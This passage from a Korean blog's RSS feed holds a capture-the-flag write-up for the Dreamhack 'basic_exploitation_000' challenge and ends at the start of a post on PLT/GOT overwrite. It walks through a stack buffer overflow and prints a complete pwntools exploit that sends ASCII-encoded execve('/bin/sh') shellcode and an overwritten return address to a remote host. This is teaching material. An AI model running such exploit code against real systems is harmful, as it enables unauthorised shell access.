&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;encoders&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i386&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ascii_shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tmp_shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;avoid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;2-2-dump-byte-수-계산&quot;&gt;2. 2. dump byte 수 계산&lt;/h2&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;gdb를 이용해 buf 변수에 몇 바이트가 할당되었는지 확인해 보자.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/basic_exploitation_000/Untitled%203.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;이 부분을 봐도 되고,&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/basic_exploitation_000/Untitled%204.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;이 부분을 봐도 된다. 첫 번째 사진의 경우 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;esp&lt;/code&gt;에 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-0x80&lt;/code&gt;을 더하고 있고(저 시점에서는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ebp&lt;/code&gt;==&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;esp&lt;/code&gt;이다) 두번째 사진에서는 scanf의 두번째 인자(입력값이 저장될 주소)로 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ebp-0x80&lt;/code&gt;을 하고 있다.&lt;/p&gt;

&lt;p&gt;즉, buf[0]에서부터 ret add까지의 바이트 수는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x84 byte&lt;/code&gt;이다.&lt;/p&gt;

&lt;p&gt;따라서 dump byte의 바이트 수는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x84-shellcode byte&lt;/code&gt; 가 된다.&lt;/p&gt;

&lt;p&gt;이 점을 반영하기 위해 아래와 같이 코딩했다.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;update&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;arch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;i386&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;linux&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;avoid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x09&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x0a&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x0b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x0c&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x0d&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x20&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;tmp_shellcode&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;asm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shellcraft&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;execve&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin/sh&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;encoders&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i386&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ascii_shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tmp_shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;avoid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;shellcode_len&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;A&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x84&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shellcode_len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;2-3-ret-address-알아내기&quot;&gt;2. 3. ret address 알아내기&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;주어진 소스를 다시 보면, buf의 시작 주소를 출력해 준다는 것을 알 수 있다. 따라서 프로그램의 출력값을 읽어오는 pwntools의 recv 함수가 필요하다.&lt;/p&gt;

&lt;p&gt;아래와 같이 코딩했다.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# receiving data and sending data
&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;{target_url}&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port_num&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;})&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;# process(&quot;./basic_exploitation_000&quot;)
&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;dump&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;(&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dump&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;)&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# constructing payload
&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;ret_add&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;출력되는 데이터는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;buf = ({address})&lt;/code&gt; 의 형태일 것이기 때문에 데이터를 받아 소괄호를 기준으로 데이터를 분리해 내는 작업을 하도록 만들었다.&lt;/p&gt;

&lt;p&gt;그런데 사실 더 편리한 방법이 있다.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;...(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;생략&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)...&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;buf = (&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;ret_add&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# 0x00000000 format
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;...(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;후략&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)...&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;이렇게 할 걸….&lt;/p&gt;

&lt;p&gt;문제 다 풀고 나서 생각났다……………………&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;3-익스플로잇-수행&quot;&gt;3. 익스플로잇 수행&lt;/h1&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;앞서 짠 코드들을 전부 조합하면 아래와 같은 익스플로잇이 나온다.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# receiving data and sending data
&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;{target_url}&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port_num&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;})&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;dump&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;(&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dump&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;)&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# constructing payload
&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;update&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;arch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;i386&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;linux&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;avoid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x09&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x0a&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x0b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x0c&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x0d&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x20&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;tmp_shellcode&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;asm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shellcraft&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;execve&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin/sh&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;encoders&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i386&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ascii_shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tmp_shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;avoid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;shellcode_len&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;ret_add&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;A&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x84&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shellcode_len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ret_add&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hexdump&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# gdb.attach(p)
# raw_input(&quot;1&quot;)
&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;그 결과, 목표 시스템의 쉘을 획득할 수 있었고, ls 명령어로 플래그 파일의 위치를 확인한 후 (find 명령어로 해도 되는데 나는 ls 명령어로 눈에 보이는 곳에 있는지 확인하고 없다면 find 명령어를 사용하는 쪽을 선호한다) cat 명령어를 이용해 플래그를 알아냈다.&lt;/p&gt;
</description>
        <pubDate>Wed, 28 Dec 2022 18:11:23 +0900</pubDate>
        <link>http://localhost:4000/blog/dreamhack_system_hacking/step5-basic_exploitation_000</link>
        <guid isPermaLink="true">http://localhost:4000/blog/dreamhack_system_hacking/step5-basic_exploitation_000</guid>
      </item>
    
      <item>
        <title>PLT &amp; GOT Overwrite in x86-64</title>
        <description>&lt;h1 id=&quot;0-pltgot란&quot;&gt;0. PLT&amp;amp;GOT란?&lt;/h1&gt;

&lt;p&gt;&lt;a href=&quot;https://toubva.github.io/blog/protostar-stack5-x86-x64/#/&quot;&gt;이전 포스트의 섹션 3&lt;/a&gt; 에서 다루었던 요소가 있다. 바로 GCC 를 이용한 C 언어 소스 코드 컴파일 시, 파일 실행 시의 행위였다. 가볍게 해당 과정을 되살려보자. (정적 라이브러리 방식은 현재 주제와 관련 없으므로 쓰지 않았다)&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;01-컴파일-시의-행위동적-라이브러리-참조&quot;&gt;0.1. 컴파일 시의 행위(동적 라이브러리 참조)&lt;/h2&gt;

&lt;ol&gt;
  &lt;li&gt;프로그램 컴파일 명령어를 보낸다.&lt;/li&gt;
  &lt;li&gt;gcc는 링커를 트리거한다.&lt;/li&gt;
  &lt;li&gt;링커는 어떤 컴파일러를 쓰는지, 소스에는 어떤 라이브러리가 명시되어 있는지 체크해 필요한 라이브러리를 찾아낸다.
    &lt;ul&gt;
